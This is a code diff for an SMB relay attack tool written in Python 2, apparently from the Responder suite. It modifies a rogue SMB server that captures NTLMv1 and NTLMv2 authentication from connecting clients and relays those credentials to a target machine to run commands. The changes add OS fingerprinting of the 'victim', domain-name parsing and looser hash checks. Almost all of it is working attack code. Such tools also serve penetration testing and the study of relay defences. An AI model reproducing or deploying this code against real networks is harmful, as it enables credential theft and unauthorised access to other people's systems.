@@ -14,7 +14,7 @@
 # 
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
-import sys, os, struct,re,socket,random, RelayPackets,optparse,ConfigParser, thread
+import sys, os, struct,re,socket,random, RelayPackets,optparse,thread
 from FingerprintRelay import RunSmbFinger
 from odict import OrderedDict
 from socket import *
@@ -120,7 +120,7 @@ def ParseHash(data,Client, Target):
     LMhashLen = struct.unpack('<H',data[51:53])[0]
     NthashLen = struct.unpack('<H',data[53:55])[0]
     Bcc = struct.unpack('<H',data[63:65])[0]
-    if NthashLen == 64:
+    if NthashLen >= 30:
        Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
        pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
        var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
@@ -129,7 +129,7 @@ def ParseHash(data,Client, Target):
           print "[+]Auth from user %s with host %s previously failed. Won't relay."%(Username, Client)
           pass
        if Username in UserToRelay:
-          print Client+' sent a NTLMv2 Response..Passing credentials to: '+Target
+          print '%s sent a NTLMv2 Response..\nVictim OS is : %s. Passing credentials to: %s'%(Client,RunSmbFinger((Client, 445)),Target)
           print "Username : ",Username
           print "Domain (if joined, if not then computer name) : ",Domain
           return data[65:65+LMhashLen],data[65+LMhashLen:65+LMhashLen+NthashLen],Username,Domain, Client
@@ -141,7 +141,7 @@ def ParseHash(data,Client, Target):
           print "Auth from user %s with host %s previously failed. Won't relay."%(Username, Client)
           pass
        if Username in UserToRelay:
-          print Client+' sent a NTLMv1 Response..Passing credentials to: '+Target
+          print '%s sent a NTLMv1 Response..\nVictim OS is : %s. Passing credentials to: %s'%(Client,RunSmbFinger((Client, 445)),Target)
           LMHashing = data[65:65+LMhashLen].encode('hex').upper()
           NTHashing = data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()
           print "Username : ",Username
@@ -163,6 +163,10 @@ def Is_Anonymous(data):
        return True
     else:
        return False
+
+def ParseDomain(data):
+    Domain = ''.join(data[81:].split('\x00\x00\x00')[:1])+'\x00\x00\x00'
+    return Domain
 
 #Function used to know which dialect number to return for NT LM 0.12
 def Parse_Nego_Dialect(data):
@@ -193,7 +197,7 @@ def Parse_Nego_Dialect(data):
     if test[10] == "NT LM 0.12":
        return "\x0a\x00"
 
-def SmbRogueSrv139(key,Target):
+def SmbRogueSrv139(key,Target,DomainMachineName):
    try:
      s = socket(AF_INET,SOCK_STREAM)
      s.setsockopt(SOL_SOCKET,SO_REUSEADDR, 1)
@@ -209,8 +213,8 @@ def SmbRogueSrv139(key,Target):
          conn.send(buffer0)
       ##Negotiate proto answer.
       if data[8:10] == "\x72\x00":
-         head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-         t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data),Key=key)
+         head = SMBHeader(cmd="\x72",flag1="\x98", flag2="\x53\xc8",pid=pidcalc(data),tid=tidcalc(data))
+         t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data),Key=key,Domain=DomainMachineName)
          t.calculate()
          packet1 = str(head)+str(t)
          buffer1 = longueur(packet1)+packet1
@@ -218,12 +222,12 @@ def SmbRogueSrv139(key,Target):
          ##Session Setup AndX Request
       if data[8:10] == "\x73\x00":
          if Is_Anonymous(data):
-            head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x01\xc8",errorcode="\x6d\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+            head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x03\xc8",errorcode="\x6d\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
             packet1 = str(head)+str(SMBSessEmpty())
             buffer1 = longueur(packet1)+packet1  
             conn.send(buffer1)
          else:
-            head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x01\xc8",errorcode="\x6d\x00\x00\xC0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+            head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x03\xc8",errorcode="\x6d\x00\x00\xC0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
             packet1 = str(head)+str(SMBSessEmpty())#Return login fail anyways.
             buffer1 = longueur(packet1)+packet1  
             conn.send(buffer1)
@@ -238,7 +242,7 @@ def RunRelay(host, Command,Domain):
     print "Target is running: ", RunSmbFinger((host, 445))
     s = socket(AF_INET, SOCK_STREAM)
     s.connect((host, 445))
-    h = SMBHeader(cmd="\x72",flag1="\x00",flag2="\x00\x00",pid="\xfa\xfb")
+    h = SMBHeader(cmd="\x72",flag1="\x18",flag2="\x03\xc7",pid="\xff\xfe", tid="\xff\xff")
     n = SMBNego(Data = SMBNegoData())
     n.calculate()
     packet0 = str(h)+str(n)
@@ -246,17 +250,18 @@ def RunRelay(host, Command,Domain):
     s.send(buffer0)
     data = s.recv(2048)
     Key = ParseAnswerKey(data,host)
+    DomainMachineName = ParseDomain(data)
     if data[8:10] == "\x72\x00":
        try: 
-          a = SmbRogueSrv139(Key,Target)
+          a = SmbRogueSrv139(Key,Target,DomainMachineName)
           if a is not None:
              LMHash,NTHash,Username,OriginalDomain, CLIENTIP = a
              if Domain == None:
                 Domain = OriginalDomain
-             if ReadData("SMBRelay-Session.txt", Target, Username, CMD) == True:
+             if ReadData("SMBRelay-Session.txt", Target, Username, CMD):
                 pass
              else:
-                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x01\xc7",pid="\xfa\xfb",mid="\x01\x00")
+                head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x03\xc8",pid="\xff\xfe",mid="\x01\x00")
                 t = SMBSessionTreeData(AnsiPasswd=LMHash,UnicodePasswd=NTHash,Username=Username,Domain=Domain,Targ=Target)
                 t.calculate()
                 packet0 = str(head)+str(t)
